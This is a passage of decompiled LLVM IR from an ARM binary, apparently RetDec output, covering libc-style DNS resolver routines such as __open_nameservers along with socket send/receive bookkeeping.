  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_19738 ], [ %stack_var_-212.1, %dec_label_pc_19880 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_19738 ], [ %v1_19888, %dec_label_pc_19880 ]
  %v2_1989c = sub i32 %stack_var_-192.0, %tmp155
  %v4_1989c = xor i32 %stack_var_-192.0, %tmp155
  %v5_1989c = xor i32 %v2_1989c, %stack_var_-192.0
  %v6_1989c = and i32 %v5_1989c, %v4_1989c
  %v5_198a0 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_198a0, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_19894
  %v7_198a0 = load i32, i32* @fp, align 4
  %v8_198a0 = sub i32 %v0_19754, %v7_198a0
  %v10_198a0 = xor i32 %v7_198a0, %v0_19754
  %v11_198a0 = xor i32 %v8_198a0, %v0_19754
  %v12_198a0 = and i32 %v11_198a0, %v10_198a0
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_19894, %bb204
  %v1_198a4.in = phi i32 [ %v6_1989c, %dec_label_pc_19894 ], [ %v12_198a0, %bb204 ]
  %v0_198a4.in = phi i32 [ %v2_1989c, %dec_label_pc_19894 ], [ %v8_198a0, %bb204 ]
  %v0_198a4 = icmp slt i32 %v0_198a4.in, 0
  %v1_198a4 = icmp slt i32 %v1_198a4.in, 0
  %v2_198a4 = xor i1 %v1_198a4, %v0_198a4
  br i1 %v2_198a4, label %dec_label_pc_1974c, label %dec_label_pc_198a8

dec_label_pc_198a8:                               ; preds = %dec_label_pc_1977c, %bb203, %dec_label_pc_197fc, %dec_label_pc_197c8, %bb205
  %v1_198ac = call i32 @__libc_close(i32 %v0_1958c)
  %v3_198b0 = load i32, i32* %stack_var_0, align 4
  %v2_198b4 = icmp eq i32 %v3_198b0, 0
  br i1 %v2_198b4, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_198a8
  %v1_198bc = load i32, i32* @r7, align 4
  %v3_198b8 = inttoptr i32 %v3_198b0 to i32*
  store i32 %v1_198bc, i32* %v3_198b8, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_198a8
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 104644, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_198b4, i32 ptrtoint (i32* @global_var_167c4.1585 to i32))
  %v2_198c4 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_19358, i32* @r4, align 4
  %v1_198cc = call i32 @free(i32 %v2_198c4)
  store i32 %v2_19358, i32* @r0, align 4
  %v1_198e4 = call i32 @__pthread_return_void()
  %v1_198f4 = call i32 @__pthread_return_0()
  %v0_19900 = load i32, i32* @r6, align 4
  %v3_19900 = sdiv i32 %v0_19900, 256
  %v0_19904 = load i32, i32* @sl, align 4
  store i32 %v0_19904, i32* @global_var_31840.1571, align 4
  store i32 %v2_19358, i32* @r0, align 4
  %v1_19910 = trunc i32 %v3_19900 to i8
  store i8 %v1_19910, i8* @global_var_2b595.1574, align 1
  %v1_19914 = trunc i32 %v0_19900 to i8
  store i8 %v1_19914, i8* bitcast (i8** @global_var_2b594.1573 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_19924.1586 to i32), i32* @lr, align 4
  %v1_19920 = call i32 @__pthread_return_void()
  %v0_19aac.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_19aac

dec_label_pc_19928:                               ; preds = %dec_label_pc_195bc, %dec_label_pc_195dc
  %v0_19928 = load i32, i32* @sl, align 4
  %v1_19928 = add i32 %v0_19928, 1
  %v2_19930 = srem i32 %v1_19928, %arg3
  store i32 %v2_19930, i32* @sl, align 4
  %v2_19934 = icmp eq i32 %v2_19930, 0
  br i1 %v2_19934, label %dec_label_pc_1993c, label %dec_label_pc_199f4.backedge

dec_label_pc_1993c:                               ; preds = %dec_label_pc_19928
  %v1_19944 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_199f8.outer.backedge

dec_label_pc_199f8.outer.backedge:                ; preds = %dec_label_pc_1993c, %dec_label_pc_199d8, %.thread19
  %stack_var_-204.1.ph.be = phi i32 [ %v7_196d0, %.thread19 ], [ -1, %dec_label_pc_199d8 ], [ -1, %dec_label_pc_1993c ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_199e0, %dec_label_pc_199d8 ], [ %v1_19944, %dec_label_pc_1993c ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_193dc.lr.ph, label %dec_label_pc_19a14

dec_label_pc_19954:                               ; preds = %dec_label_pc_1984c
  %v1_19954 = inttoptr i32 %v0_1984c to i32*
  %v2_19954 = load i32, i32* %v1_19954, align 4
  %v1_19958 = call i32 @free(i32 %v2_19954)
  br label %dec_label_pc_1995c

dec_label_pc_1995c:                               ; preds = %dec_label_pc_196ec, %dec_label_pc_19640, %dec_label_pc_1977c, %dec_label_pc_19770, %dec_label_pc_19658, %dec_label_pc_19620, %dec_label_pc_19954
  br i1 %v2_19960, label %dec_label_pc_19968, label %dec_label_pc_199c4

dec_label_pc_19968:                               ; preds = %dec_label_pc_1995c
  store i32 %v2_19358, i32* @r5, align 4
  store i32 %v2_19358, i32* @r0, align 4
  %v1_19980 = call i32 @__pthread_return_void()
  %v1_19990 = call i32 @__pthread_return_0()
  %v2_1999c = load i32, i32* @global_var_31910.1579, align 4
  store i32 %v2_19358, i32* @r0, align 4
  %v1_199ac = call i32 @__pthread_return_void()
  %v1_199b4 = add i32 %v2_1999c, -1
  store i32 %v1_199b4, i32* @r4, align 4
  %v5_199bc = icmp slt i32 %v6_199bc, %v1_199b4
  br i1 %v5_199bc, label %.thread27, label %dec_label_pc_199c4

.thread27:                                        ; preds = %dec_label_pc_19968
  %v7_199bc = add i32 %v6_199bc, 1
  br label %dec_label_pc_199f4.backedge

dec_label_pc_199c4:                               ; preds = %dec_label_pc_19968, %dec_label_pc_1995c
  %v0_199c4 = load i32, i32* @sl, align 4
  %v1_199c4 = add i32 %v0_199c4, 1
  %v2_199cc = srem i32 %v1_199c4, %arg3
  store i32 %v2_199cc, i32* @sl, align 4
  %v2_199d0 = icmp eq i32 %v2_199cc, 0
  br i1 %v2_199d0, label %dec_label_pc_199d8, label %dec_label_pc_199f4.backedge

dec_label_pc_199d8:                               ; preds = %dec_label_pc_199c4
  %v1_199e0 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_199f8.outer.backedge

dec_label_pc_199f4.backedge:                      ; preds = %dec_label_pc_19928, %dec_label_pc_199c4, %.thread27
  %storemerge87 = phi i32 [ %v7_199bc, %.thread27 ], [ -1, %dec_label_pc_199c4 ], [ -1, %dec_label_pc_19928 ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_193dc.lr.ph.preheader, label %dec_label_pc_19a14

dec_label_pc_193dc.lr.ph.preheader:               ; preds = %dec_label_pc_193dc.lr.ph.preheader.lr.ph, %dec_label_pc_199f4.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_193dc.lr.ph.preheader.lr.ph ], [ %v0_1958c, %dec_label_pc_199f4.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_193d4, %dec_label_pc_193dc.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_199f4.backedge ]
  %v0_199f4259 = phi i32 [ -1, %dec_label_pc_193dc.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_199f4.backedge ]
  br label %dec_label_pc_193dc.lr.ph

dec_label_pc_193dc.lr.ph:                         ; preds = %dec_label_pc_193dc.lr.ph.preheader, %dec_label_pc_199f8.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v0_1958c, %dec_label_pc_199f8.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_193dc.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_199f8.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_193dc.lr.ph.preheader ]
  %v6_199bc = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_199f8.outer.backedge ], [ %v0_199f4259, %dec_label_pc_193dc.lr.ph.preheader ]
  %v1_19484 = icmp slt i32 %v6_199bc, 0
  %v4_194c0 = mul i32 %v6_199bc, 4
  %v5_194c0 = add i32 %v4_194c0, ptrtoint (i32* @global_var_318f0.1583 to i32)
  %v6_194c0 = inttoptr i32 %v5_194c0 to i32*
  br label %dec_label_pc_193dc

dec_label_pc_19a08:                               ; preds = %bb195, %.thread8, %dec_label_pc_19334, %dec_label_pc_19328
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_19a14

dec_label_pc_19a14:                               ; preds = %dec_label_pc_19344, %dec_label_pc_199f4.backedge, %dec_label_pc_199f8.outer.backedge, %bb200, %dec_label_pc_194cc, %dec_label_pc_199f8.backedge, %dec_label_pc_19a08
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_19a08 ], [ %v0_1958c, %dec_label_pc_199f8.backedge ], [ %v1_193e4, %dec_label_pc_194cc ], [ %v1_193e4, %bb200 ], [ %v0_1958c, %dec_label_pc_199f8.outer.backedge ], [ -1, %dec_label_pc_19344 ], [ %v0_1958c, %dec_label_pc_199f4.backedge ]
  %v0_19a14 = call i32 @__GI___h_errno_location()
  %v2_19a1c = inttoptr i32 %v0_19a14 to i32*
  store i32 -1, i32* %v2_19a1c, align 4
  %v0_19a20 = load i32, i32* @sb, align 4
  store i32 %v0_19a20, i32* @r6, align 4
  br label %dec_label_pc_19a24

dec_label_pc_19a24:                               ; preds = %dec_label_pc_19710, %dec_label_pc_19a14
  %v1_19a2c = phi i32 [ %stack_var_-216.2, %dec_label_pc_19a14 ], [ %v0_1958c, %dec_label_pc_19710 ]
  %v7_19a28 = icmp eq i32 %v1_19a2c, -1
  br i1 %v7_19a28, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_19a24
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_19a24, %bb208
  store i32 105012, i32* @lr, align 4
  %v1_19a30 = xor i1 %v7_19a28, true
  call void @__pseudo_cond_branch(i1 %v1_19a30, i32 ptrtoint (i32* @global_var_14064.1576 to i32))
  %v2_19a34 = load i32, i32* %stack_var_-236, align 4
  %v1_19a38 = call i32 @free(i32 %v2_19a34)
  %v0_19a3c = load i32, i32* @r7, align 4
  %v1_19a40 = call i32 @free(i32 %v0_19a3c)
  %v0_19a44 = load i32, i32* @sl, align 4
  %v7_19a44 = icmp eq i32 %v0_19a44, -1
  br i1 %v7_19a44, label %bb210, label %dec_label_pc_19a50

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_19aac

dec_label_pc_19a50:                               ; preds = %bb209
  %v2_19a50 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_19a50, i32* @r0, align 4
  %v1_19a68 = call i32 @__pthread_return_void()
  %v1_19a78 = call i32 @__pthread_return_0()
  %v0_19a84 = load i32, i32* @r6, align 4
  %v3_19a84 = sdiv i32 %v0_19a84, 256
  %v0_19a88 = load i32, i32* @sl, align 4
  store i32 %v0_19a88, i32* @global_var_31840.1571, align 4
  store i32 %v2_19a50, i32* @r0, align 4
  %v1_19a94 = trunc i32 %v3_19a84 to i8
  store i8 %v1_19a94, i8* @global_var_2b595.1574, align 1
  %v1_19a98 = trunc i32 %v0_19a84 to i8
  store i8 %v1_19a98, i8* bitcast (i8** @global_var_2b594.1573 to i8*), align 4
  store i32 105128, i32* @lr, align 4
  %v1_19aa4 = call i32 @__pthread_return_void()
  br label %dec_label_pc_19aac

dec_label_pc_19aac:                               ; preds = %bb210, %bb207, %dec_label_pc_19a50
  %v0_19aac = phi i32 [ %v0_19a44, %bb210 ], [ %v0_19aac.pre, %bb207 ], [ -1, %dec_label_pc_19a50 ]
  store i32 %v3_192e0, i32* @r4, align 4
  store i32 %v6_192e0, i32* @r5, align 4
  store i32 %v9_192e0, i32* @r6, align 4
  store i32 %v12_192e0, i32* @r7, align 4
  store i32 %v15_192e0, i32* @r8, align 4
  store i32 %v18_192e0, i32* @sb, align 4
  store i32 %v21_192e0, i32* @sl, align 4
  ret i32 %v0_19aac

; uselistorder directives
  uselistorder i32 %v0_19a84, { 1, 0 }
  uselistorder i32 %v0_19a44, { 1, 0 }
  uselistorder i1 %v7_19a28, { 1, 0 }
  uselistorder i32 %v6_199bc, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v0_19900, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_19754, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1984c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1980c, { 1, 0 }
  uselistorder i32 %v0_1972c, { 1, 0 }
  uselistorder i32 %v0_19730, { 1, 0 }
  uselistorder i32 %v6_19630, { 1, 0 }
  uselistorder i32 %v0_1958c, { 5, 0, 1, 2, 3, 4, 6, 8, 7, 10, 9, 12, 13, 11 }
  uselistorder i32 %v1_194f8, { 1, 0 }
  uselistorder i32 %v2_19498, { 1, 0 }
  uselistorder i32 %v1_19410, { 1, 2, 0 }
  uselistorder i1 %v7_193e0, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_193e4, { 1, 2, 0 }
  uselistorder i32 %v0_193d4, { 1, 0 }
  uselistorder i32 %v2_19358, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i8* %stack_var_-100, { 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32, i32)* @__libc_recv, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32*, i32, i32)* @__libc_send, { 10, 5, 6, 0, 1, 2, 3, 4, 7, 8, 9, 11 }
  uselistorder i32 101, { 5, 1, 2, 3, 0, 6, 4 }
  uselistorder i32 (i32, %sockaddr*, i32)* @__libc_connect, { 8, 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder i32 ()* @socket, { 0, 13, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 12 }
  uselistorder i32 (i32)* @inet_addr, { 1, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 0, 2, 1, 3 }
  uselistorder i8* @global_var_2b595.1574, { 2, 1, 0 }
  uselistorder i32 512, { 3, 4, 2, 5, 1, 6, 7, 8, 9, 0 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_19aac, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_19a24, { 1, 0 }
  uselistorder label %dec_label_pc_19a14, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_19a08, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_193dc.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_199f4.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1995c, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_199f8.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19928, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_198a8, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_19894, { 1, 0 }
  uselistorder label %dec_label_pc_19880, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1987c, { 1, 0 }
  uselistorder label %dec_label_pc_197e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19720, { 1, 0 }
  uselistorder label %dec_label_pc_19710, { 1, 0 }
  uselistorder label %dec_label_pc_199f8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_19578, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_194cc, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_19ab8:
  %v0_19ab8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19ab8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_19ab8
  %v5_19ab8 = mul i32 %arg2, 256
  %v6_19ab8 = and i32 %v5_19ab8, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_19ab8, %bb
  %v10_19ae8 = phi i32 [ %arg1, %dec_label_pc_19ab8 ], [ %v6_19ab8, %bb ]
  ret i32 %v10_19ae8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__open_nameservers(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_19aec = load i32, i32* @r4, align 4
  store i32 %v3_19aec, i32* %stack_var_-28, align 4
  %v6_19aec = load i32, i32* @r5, align 4
  %v9_19aec = load i32, i32* @r6, align 4
  %v12_19aec = load i32, i32* @r7, align 4
  %v15_19aec = load i32, i32* @r8, align 4
  %v18_19aec = load i32, i32* @sl, align 4
  %v2_19af0 = ptrtoint i32* %stack_var_-192 to i32
  %v2_19af4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_19af4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_2b598.1410 to i32), i32* %r2.global-to-local, align 4
  %v1_19b08 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2b598.1410 to i32), i32* %r0.global-to-local, align 4
  store i32 105244, i32* @lr, align 4
  %v1_19b18 = call i32 @__pthread_return_0()
  store i32 %v1_19b18, i32* %r0.global-to-local, align 4
  %v2_19b20 = load i32, i32* @global_var_3190c.1415, align 4
  %v5_19b28 = icmp sgt i32 %v2_19b20, 0
  br i1 %v5_19b28, label %dec_label_pc_19d64, label %dec_label_pc_19b2c

dec_label_pc_19b2c:                               ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_22fd8.1593 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_22fec.1595 to i32), i32* @r1, align 4
  %v3_19b34 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_22fd8.1593 to i32), i32 ptrtoint (i32* @global_var_22fec.1595 to i32))
  store i32 %v3_19b34, i32* %r0.global-to-local, align 4
  store i32 %v3_19b34, i32* @sl, align 4
  %v2_19b38 = icmp eq i32 %v3_19b34, 0
  br i1 %v2_19b38, label %dec_label_pc_19b40, label %dec_label_pc_19d2c.preheader

dec_label_pc_19b40:                               ; preds = %dec_label_pc_19b2c
  store i32 ptrtoint ([24 x i8]* @global_var_22ff0.1597 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_22fec.1595 to i32), i32* @r1, align 4
  %v3_19b48 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_22ff0.1597 to i32), i32 ptrtoint (i32* @global_var_22fec.1595 to i32))
  store i32 %v3_19b48, i32* %r0.global-to-local, align 4
  store i32 %v3_19b48, i32* @sl, align 4
  %v2_19b4c = icmp eq i32 %v3_19b48, 0
  br i1 %v2_19b4c, label %dec_label_pc_19d58, label %dec_label_pc_19d2c.preheader

dec_label_pc_19d2c.preheader:                     ; preds = %dec_label_pc_19b2c, %dec_label_pc_19b40
  %v0_19d3426 = phi i32 [ %v3_19b34, %dec_label_pc_19b2c ], [ %v3_19b48, %dec_label_pc_19b40 ]
  %v2_19ba0 = ptrtoint i32* %stack_var_-28 to i32
  %v3_19c3c = inttoptr i32 %tmp to i8*
  store i32 %v2_19af0, i32* %r0.global-to-local, align 4
  store i32 %v0_19d3426, i32* %r2.global-to-local, align 4
  %v3_19d3866 = call i32 @fgets(i32 %v2_19af0, i32 128, i32 %v0_19d3426)
  store i32 %v3_19d3866, i32* %r0.global-to-local, align 4
  %v2_19d3c68 = icmp eq i32 %v3_19d3866, 0
  store i32 %v2_19af0, i32* @r4, align 4
  br i1 %v2_19d3c68, label %dec_label_pc_19d4c, label %dec_label_pc_19b5c.preheader.lr.ph

dec_label_pc_19b5c.preheader.lr.ph:               ; preds = %dec_label_pc_19d2c.preheader
  %v1_19b5c11 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_19b5c.preheader

dec_label_pc_19b58:                               ; preds = %dec_label_pc_19b68
  %v1_19b58 = add i32 %v0_19b58, 1
  store i32 %v1_19b58, i32* %r0.global-to-local, align 4
  %v1_19b5c = inttoptr i32 %v1_19b58 to i8*
  %v2_19b5c = load i8, i8* %v1_19b5c, align 1
  %v3_19b5c = zext i8 %v2_19b5c to i32
  store i32 %v3_19b5c, i32* %r2.global-to-local, align 4
  %v2_19b60 = icmp eq i8 %v2_19b5c, 0
  br i1 %v2_19b60, label %dec_label_pc_19b7c, label %dec_label_pc_19b68

dec_label_pc_19b68:                               ; preds = %dec_label_pc_19b68.lr.ph, %dec_label_pc_19b58
  %v0_19b58 = phi i32 [ %v2_19af0, %dec_label_pc_19b68.lr.ph ], [ %v1_19b58, %dec_label_pc_19b58 ]
  %v1_19b70 = phi i32 [ %v3_19b5c13, %dec_label_pc_19b68.lr.ph ], [ %v3_19b5c, %dec_label_pc_19b58 ]
  %v3_19b70 = mul nuw nsw i32 %v1_19b70, 2
  %v4_19b70 = add i32 %v3_19b70, %v2_19b6c.pre
  %v5_19b70 = inttoptr i32 %v4_19b70 to i8*
  %v6_19b70 = load i8, i8* %v5_19b70, align 1
  %v1_19b74 = and i8 %v6_19b70, 32
  %v2_19b74 = icmp eq i8 %v1_19b74, 0
  br i1 %v2_19b74, label %dec_label_pc_19b7c, label %dec_label_pc_19b58

dec_label_pc_19b7c:                               ; preds = %dec_label_pc_19b58, %dec_label_pc_19b68, %dec_label_pc_19b5c.preheader
  %v0_19c1435 = phi i32 [ %v2_19af0, %dec_label_pc_19b5c.preheader ], [ %v1_19b58, %dec_label_pc_19b58 ], [ %v0_19b58, %dec_label_pc_19b68 ]
  %v0_19b90 = phi i32 [ %v3_19b5c13, %dec_label_pc_19b5c.preheader ], [ %v3_19b5c, %dec_label_pc_19b58 ], [ %v1_19b70, %dec_label_pc_19b68 ]
  %v7_19b7c = icmp eq i32 %v0_19b90, 10
  br i1 %v7_19b7c, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_19b7c
  %v3_19b80 = icmp eq i32 %v0_19b90, 0
  br i1 %v3_19b80, label %bb55, label %dec_label_pc_19b90

.thread3:                                         ; preds = %dec_label_pc_19b7c
  br label %dec_label_pc_19d2c.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_19d2c.backedge

dec_label_pc_19d2c.backedge:                      ; preds = %dec_label_pc_19d08, %dec_label_pc_19d20, %bb55, %dec_label_pc_19ca0, %.thread3, %dec_label_pc_19b90
  %v0_19d34.pre = load i32, i32* @sl, align 4
  store i32 %v2_19af0, i32* %r0.global-to-local, align 4
  store i32 %v0_19d34.pre, i32* %r2.global-to-local, align 4
  %v3_19d38 = call i32 @fgets(i32 %v2_19af0, i32 128, i32 %v0_19d34.pre)
  store i32 %v3_19d38, i32* %r0.global-to-local, align 4
  %v2_19d3c = icmp eq i32 %v3_19d38, 0
  store i32 %v2_19af0, i32* @r4, align 4
  br i1 %v2_19d3c, label %dec_label_pc_19d4c, label %dec_label_pc_19b5c.preheader

dec_label_pc_19b90:                               ; preds = %bb
  %v7_19b90 = icmp eq i32 %v0_19b90, 35
  br i1 %v7_19b90, label %dec_label_pc_19d2c.backedge, label %dec_label_pc_19c14

dec_label_pc_19ba0:                               ; preds = %bb58
  store i32 %v2_19ba0, i32* %r2.global-to-local, align 4
  %v4_19ba4 = mul i32 %storemerge, 4
  %v5_19ba4 = add i32 %v4_19ba4, %v2_19ba0
  %v2_19ba8 = add i32 %v5_19ba4, -36
  %v3_19ba8 = inttoptr i32 %v2_19ba8 to i32*
  store i32 %v0_19ba8, i32* %v3_19ba8, align 4
  %v0_19bb415 = load i32, i32* %r0.global-to-local, align 4
  %v1_19bb416 = inttoptr i32 %v0_19bb415 to i8*
  %v2_19bb417 = load i8, i8* %v1_19bb416, align 1
  %v3_19bb418 = zext i8 %v2_19bb417 to i32
  store i32 %v3_19bb418, i32* %r2.global-to-local, align 4
  %v2_19bb819 = icmp eq i8 %v2_19bb417, 0
  br i1 %v2_19bb819, label %dec_label_pc_19be8.preheader, label %dec_label_pc_19bc0.lr.ph

dec_label_pc_19bc0.lr.ph:                         ; preds = %dec_label_pc_19ba0
  %v2_19bc4.pre = load i32, i32* @global_var_2b254, align 4
  br label %dec_label_pc_19bc0

dec_label_pc_19bb0:                               ; preds = %dec_label_pc_19bd4
  %v1_19bb0 = add i32 %v0_19bb0, 1
  store i32 %v1_19bb0, i32* %r0.global-to-local, align 4
  %v1_19bb4 = inttoptr i32 %v1_19bb0 to i8*
  %v2_19bb4 = load i8, i8* %v1_19bb4, align 1
  %v3_19bb4 = zext i8 %v2_19bb4 to i32
  store i32 %v3_19bb4, i32* %r2.global-to-local, align 4
  %v2_19bb8 = icmp eq i8 %v2_19bb4, 0
  br i1 %v2_19bb8, label %dec_label_pc_19be8.preheader, label %dec_label_pc_19bc0

dec_label_pc_19bc0:                               ; preds = %dec_label_pc_19bc0.lr.ph, %dec_label_pc_19bb0
  %v0_19bb0 = phi i32 [ %v0_19bb415, %dec_label_pc_19bc0.lr.ph ], [ %v1_19bb0, %dec_label_pc_19bb0 ]
  %v0_19bd4 = phi i32 [ %v3_19bb418, %dec_label_pc_19bc0.lr.ph ], [ %v3_19bb4, %dec_label_pc_19bb0 ]
  %v3_19bc8 = mul nuw nsw i32 %v0_19bd4, 2
  %v4_19bc8 = add i32 %v3_19bc8, %v2_19bc4.pre
  %v5_19bc8 = inttoptr i32 %v4_19bc8 to i8*
  %v6_19bc8 = load i8, i8* %v5_19bc8, align 1
  %v1_19bcc = and i8 %v6_19bc8, 32
  %v2_19bcc = icmp eq i8 %v1_19bcc, 0
  br i1 %v2_19bcc, label %dec_label_pc_19bd4, label %dec_label_pc_19be8.preheader

dec_label_pc_19bd4:                               ; preds = %dec_label_pc_19bc0
  %v7_19bd4 = icmp eq i32 %v0_19bd4, 10
  br i1 %v7_19bd4, label %dec_label_pc_19be8.preheader, label %dec_label_pc_19bb0

dec_label_pc_19be8.preheader:                     ; preds = %dec_label_pc_19bd4, %dec_label_pc_19bc0, %dec_label_pc_19bb0, %dec_label_pc_19ba0
  %v0_19be820 = phi i32 [ %v0_19bb415, %dec_label_pc_19ba0 ], [ %v0_19bb0, %dec_label_pc_19bd4 ], [ %v0_19bb0, %dec_label_pc_19bc0 ], [ %v1_19bb0, %dec_label_pc_19bb0 ]
  %v1_19be821 = inttoptr i32 %v0_19be820 to i8*
  %v2_19be822 = load i8, i8* %v1_19be821, align 1
  %v3_19be823 = zext i8 %v2_19be822 to i32
  store i32 %v3_19be823, i32* %r2.global-to-local, align 4
  %v2_19bec24 = icmp eq i8 %v2_19be822, 0
  br i1 %v2_19bec24, label %dec_label_pc_19c10, label %dec_label_pc_19bf4

dec_label_pc_19be0:                               ; preds = %dec_label_pc_19bf4, %dec_label_pc_19c08
  %v3_19be4 = inttoptr i32 %v2_19be4 to i8*
  store i8 0, i8* %v3_19be4, align 1
  %v4_19be4 = load i32, i32* %r0.global-to-local, align 4
  %v5_19be4 = add i32 %v4_19be4, 1
  store i32 %v5_19be4, i32* %r0.global-to-local, align 4
  %v1_19be8 = inttoptr i32 %v5_19be4 to i8*
  %v2_19be8 = load i8, i8* %v1_19be8, align 1
  %v3_19be8 = zext i8 %v2_19be8 to i32
  store i32 %v3_19be8, i32* %r2.global-to-local, align 4
  %v2_19bec = icmp eq i8 %v2_19be8, 0
  br i1 %v2_19bec, label %dec_label_pc_19c10, label %dec_label_pc_19bf4

dec_label_pc_19bf4:                               ; preds = %dec_label_pc_19be8.preheader, %dec_label_pc_19be0
  %v0_19c08 = phi i32 [ %v3_19be8, %dec_label_pc_19be0 ], [ %v3_19be823, %dec_label_pc_19be8.preheader ]
  %v2_19be4 = phi i32 [ %v5_19be4, %dec_label_pc_19be0 ], [ %v0_19be820, %dec_label_pc_19be8.preheader ]
  %v2_19bf8 = load i32, i32* @global_var_2b254, align 4
  %v3_19bfc = mul nuw nsw i32 %v0_19c08, 2
  %v4_19bfc = add i32 %v2_19bf8, %v3_19bfc
  %v5_19bfc = inttoptr i32 %v4_19bfc to i8*
  %v6_19bfc = load i8, i8* %v5_19bfc, align 1
  %v1_19c00 = and i8 %v6_19bfc, 32
  %v2_19c00 = icmp eq i8 %v1_19c00, 0
  br i1 %v2_19c00, label %dec_label_pc_19c08, label %dec_label_pc_19be0

